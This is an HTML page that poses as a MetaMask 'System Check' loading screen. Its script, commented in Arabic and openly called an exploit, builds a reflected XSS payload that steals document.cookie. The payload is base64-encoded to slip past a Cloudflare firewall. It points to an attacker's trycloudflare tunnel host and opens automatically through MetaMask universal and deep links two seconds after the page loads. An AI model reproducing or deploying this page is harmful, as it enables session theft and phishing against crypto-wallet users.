<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MetaMask | System Check</title>
    <style>
        body { background: #121212; color: #ffffff; font-family: sans-serif; text-align: center; padding-top: 100px; }
        .loader { border: 4px solid #333; border-top: 4px solid #f6851b; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { color: #f6851b; font-weight: bold; margin-top: 20px; }
    </style>
</head>
<body>

    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Head.svg" width="80" alt="MetaMask">
    <h3>Connecting to Secure Node...</h3>
    <div class="loader"></div>
    <p class="status" id="status_text">Verifying Session...</p>

    <script>
        // 1. رابط الـ Cloudflare Tunnel الخاص بك (تأكد منه)
        const targetHost = "favour-nato-realized-instructor.trycloudflare.com";

        // 2. الكود الخبيث المراد تنفيذه (Raw Payload)
        // يقوم بإظهار تنبيه ثم سحب الكوكيز وإرسالها للسيرفر
        const rawPayload = `
            <script>
                alert('Bypass Successful: Reflected XSS Executed');
                fetch('/log?stolen_cookie=' + document.cookie);
            <\/script>
        `;

        // 3. التشفير باستخدام Base64 لتجاوز حماية Cloudflare (403 Bypass)
        // دالة btoa تحول النص إلى صيغة لا يفهمها جدار الحماية كـ "تهديد"
        const encodedPayload = btoa(rawPayload.trim());

        // 4. بناء الرابط النهائي مع الباراميتر المشفر
        const xssQuery = "?b64xss=" + encodedPayload;
        const fullTarget = targetHost + xssQuery;

        // 5. روابط الـ Deep Link والـ Universal Link
        const universalLink = "https://metamask.app.link/dapp/" + fullTarget;
        const deepLink = "metamask://dapp/" + fullTarget;

        function startExploit() {
            document.getElementById('status_text').innerText = "Redirecting to MetaMask...";
            
            // المحاولة الأولى: Universal Link (أكثر استقراراً)
            window.location.href = universalLink;

            // المحاولة الثانية: Deep Link (البروتوكول المباشر) بعد 1 ثانية
            setTimeout(() => {
                window.location.replace(deepLink);
            }, 1000);
        }

        // تشغيل الهجوم تلقائياً عند تحميل الصفحة في Vercel
        window.onload = function() {
            setTimeout(startExploit, 2000);
        };
    </script>

</body>
</html>
